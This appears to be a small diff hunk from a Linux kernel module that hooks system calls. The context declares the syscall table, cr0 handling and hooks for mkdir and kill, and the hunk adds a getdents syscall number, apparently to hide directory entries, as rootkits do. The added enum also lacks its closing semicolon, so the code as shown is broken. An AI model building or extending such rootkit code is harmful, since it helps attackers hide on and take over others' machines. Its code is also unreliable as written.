@@ -39,6 +39,10 @@ unsigned long cr0;
 unsigned long *__syscall_table;
 unsigned long __force_order;
 
+enum NR_getdents{
+	__NR_getdents = 141
+}
+
 asmlinkage int hook_mkdir(const struct pt_regs *regs);
 //Hooking kill
 asmlinkage int hook_kill(const struct pt_regs *regs);
